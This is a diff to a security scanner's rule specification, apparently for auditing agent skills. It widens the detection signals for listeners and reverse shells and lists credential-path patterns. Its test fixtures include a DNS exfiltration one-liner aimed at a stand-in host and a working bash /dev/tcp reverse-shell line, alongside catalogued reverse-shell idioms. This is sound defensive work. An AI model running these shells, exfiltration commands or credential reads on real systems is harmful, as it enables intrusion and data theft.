@@ -173,10 +173,18 @@ The motivating example. Regex-only misses paraphrase; the fix is a **family + T3
 - **Fixtures:** TP: `nslookup $(whoami | xxd -p).exfil.evil`. FP: `resolver = "8.8.8.8"`.
 
 ### SG-NET-006 — Listener / bind-all  (AST01/AST06, high)
-- **Signals:** bind to `0.0.0.0` / `::` / `INADDR_ANY`, `nc -l`, `socket.bind(('',port))`, reverse-shell idioms (`bash -i >& /dev/tcp/…`, `nc -e`, `socket→dup2→exec`).
-- **FP carve-outs:** binding `127.0.0.1`/`localhost` is fine; a documented dev server on localhost. Reverse-shell idiom has **no** benign form → keep critical-adjacent.
-- **Confidence:** reverse-shell idiom 0.95; bind-all listener 0.7.
-- **Fixtures:** TP: `bash -i >& /dev/tcp/1.2.3.4/4444 0>&1`. FP: `app.listen(3000, '127.0.0.1')`.
+- **Signals:** bind to `0.0.0.0` / `::`, and reverse-shell idioms across the common families —
+  `bash -i >& /dev/tcp/…`, any shell's `sh|ash|dash|ksh|zsh -i` redirected to `/dev/tcp|udp`,
+  `exec N<>/dev/tcp/…`, `nc -e`, `ncat/netcat --exec/-e/--sh-exec`, `socat … EXEC:|SYSTEM:`,
+  the `mkfifo … nc` backpipe one-liner, interpreter shells (`os.dup2(sock.fileno())`,
+  `pty.spawn('/bin/…')`), and PowerShell `New-Object Net.Sockets.TCPClient`.
+- **FP carve-outs:** binding `127.0.0.1`/`localhost` is fine; a documented dev server on localhost.
+  Reverse-shell idiom has **no** benign form → keep critical-adjacent. Near-misses that must stay
+  clean: `app.listen(3000,'127.0.0.1')`, `bash -c '…'`, `import pty`, `New-Object …WebClient`,
+  `nc --version`.
+- **Confidence:** reverse-shell idiom 0.85–0.95; `pty.spawn` 0.75; bind-all listener 0.7.
+- **Fixtures:** `TestReverseShellIdiomsCovered` in `pkg/rules/rules_test.go` (10 TP families + 6 FP
+  near-misses). TP: `bash -i >& /dev/tcp/1.2.3.4/4444 0>&1`. FP: `app.listen(3000, '127.0.0.1')`.
 
 ### SG-SEC-001 — Sensitive-path read  (AST03, critical)
 - **Signals:** path references to `~/.ssh/, ~/.aws/, ~/.config/gcloud, .env, **/credentials*, *.pem, *.key, id_rsa, *.wallet, keystore`, browser stores (`Login Data`, `cookies.sqlite`, `Local Storage`), OS keychains (`security find-generic-password`, `secret-tool`, `Credential Manager`) — **in a read/access context**.
